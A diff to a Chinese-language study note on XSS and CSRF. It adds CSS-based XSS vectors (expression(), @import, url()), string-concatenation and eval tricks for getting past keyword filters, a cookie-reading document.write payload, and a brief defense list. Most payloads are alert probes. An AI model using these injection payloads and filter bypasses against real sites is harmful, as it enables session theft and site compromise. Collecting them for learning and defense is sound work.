@@ -12,7 +12,7 @@
 
 > XSS和CSRF有一些类似的地方，XSS的反射型和DOM漏洞都依赖于被害人点击攻击者精心构造的链接，CSRF也是这样，不同的是CSRF攻击的方式更为直接了，它无需构造什么Javascript攻击脚本，它构造的链接是目标网站本就有的功能，例如删除某一篇文章，当被害人点击这个url且浏览器本地有尚未过期的cookie时，攻击就完成了。检查CSRF是否存在的方式也很简单，只需要看referer字段是否存在并有效即可，另外，网站为了防御CSRF的攻击，也经常采用提示跳转页的方式。
 
-### 攻击和防御
+### 攻击
 
 #### 攻击的两大方式
 
@@ -45,7 +45,7 @@
 
 > 除了最直接的script标签，还有许多标签可以利用
 
-```javascript
+```html
 <a href="javascript:alert(1)">test</a>
 <a href="x" onfocus="alert('xss');" autofocus="">xss</a>
 <a href="x" onclick=eval("alert('xss');")>xss</a>
@@ -113,6 +113,17 @@
 <form method="x" action="x" onmouseup="alert('xss');"><input type=submit></form>
 
 <body onload="alert('xss');"></body>
+
+<!-- css相关的xss -->
+<div style="background-image:url('http://127.0.0.1/xss.gif')"></div>
+<style>body {background: url('http://127.0.0.1/xss.gif')}</style>
+<!-- expression()表达式在IE7及以下是有效的，在IE8及以上就失效了 -->
+<div style="{left: expression(alert('xss'))}"></div>
+<!-- 利用 @import 引入外部 js -->
+<!-- 被引用的css body {event: expression (onload = function() {alert('XSS');})} -->
+<style type="text/css">@import url(http://www.xx.css)</style>
+<!-- 还可以利用 @import 直接执行 XSS 代码 -->
+<style>@import "javascript:alert('xss')";</style>
 ```
 
 #### 补充：有关JavaScript伪协议
@@ -187,8 +198,6 @@ target="\_blank"属性是表明按照href的链接打开一个新窗口，当hre
 
 #### 补充：注释
 
-HTML注释：
-
 ```html
 <!--这是单行注释-->
 <!--
@@ -216,7 +225,7 @@ HTML注释：
     这是多行注释
 */
 
-// 这是李输入了</address> <img src=# onerror=alert(1)//，起到了闭合前文引号的同时注释后面的引号
+// 这里输入了</address> <img src=# onerror=alert(1)//，起到了闭合前文引号的同时注释后面的引号
 <img src="</address> <img src=# onerror=alert(1)//">
 ```
 
@@ -257,12 +266,28 @@ HTML注释：
   * 过滤http：可以直接用\\\\代替http:\\\
   * 过滤 . :可以用。代替，有些浏览器会自动优化中文句号
 * 过滤了空格
-  * 使用爱他空白字符代替 %0d %0a
+  * 使用其他空白字符代替 %0d %0a
 
 ##### 将特殊字符转化为HTML实体
 
 * 以php为例，默认的htmlspecialchars()不过滤单引号，因此使用htmlspecialchars()时需注意合理设置
 * 有的场景下，前端输入的返回是在script标签或则JavaScript伪协议内，这时htmlspecialchars()完全无效
+
+##### 利用函数
+
+* 这里利用一些函数就可以使用字符串拼接成JavaScript关键字和函数进行
+
+```javascript
+// window.alert("hello world")
+window["ale" + "rt"]("Hello, World!");
+
+eval("wind" + "ow.alert('Hello, World!');");
+ 
+var obj = { ale: { rt: function(msg) { alert(msg); } } };
+obj["ale"]["rt"]("Hello, World!");
+
+document.write('<script>alert(document.cookie)<\/script>')
+```
 
 #### 利用CSS进行XSS
 
@@ -332,3 +357,8 @@ width="100" height="100">
 #### 基本方式
 
 > XSS产生在于后端没有对输入的数据进行检查既返回前端，攻击者可构造script脚本进行提交。当使用GET方法提交数据时，可以直接构造型如url?query=<script>给被害人；当使用POST方法提交数据时，则需要我们在自己的服务器上构造一个恶意页面，使用表单的方式提交数据，注意此处我们写入的恶意脚本在哪，我们的恶意脚本并不是在在我们的恶意界面起作用，因为恶意界面由于同源策略等浏览器安全策略，是获得不了被害人在目标站点的cookie的，我们的恶意脚本是作为输入提交到了目标站点。
+
+### 防御
+
+* HttpOnly
+* 在响应报文的header中配置X-XSS-Protection
